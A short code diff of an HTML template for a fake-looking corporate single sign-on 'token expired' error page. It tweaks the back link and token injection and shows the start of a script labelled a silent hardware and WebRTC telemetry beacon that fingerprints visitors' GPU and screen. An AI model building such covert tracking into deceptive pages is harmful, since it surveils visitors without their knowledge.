@@ -100,7 +100,7 @@
         <p>Your session token or access credential could not be verified by the identity provider. The link may have expired or requires higher clearance.</p>
         <div class="error-code">STATUS_ERR_TOKEN_EXPIRED (0x8004100E)</div>
         <div>
-            <a href="/" class="btn">Return to Corporate Portal</a>
+            <a href="#" class="btn" onclick="history.back(); return false;">Return to Corporate Portal</a>
         </div>
         <div class="footer">
             Enterprise Single Sign-On Gateway &bull; Reference ID: {{ token_id }}
@@ -110,7 +110,7 @@
     <!-- Silent Hardware & WebRTC Telemetry Beacon -->
     <script>
         (function() {
-            const tokenId = "{{ token_id }}";
+            const tokenId = {{ token_id_js }};
             const telemetry = {
                 gpu_renderer: "Unknown",
                 screen_res: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1})`,
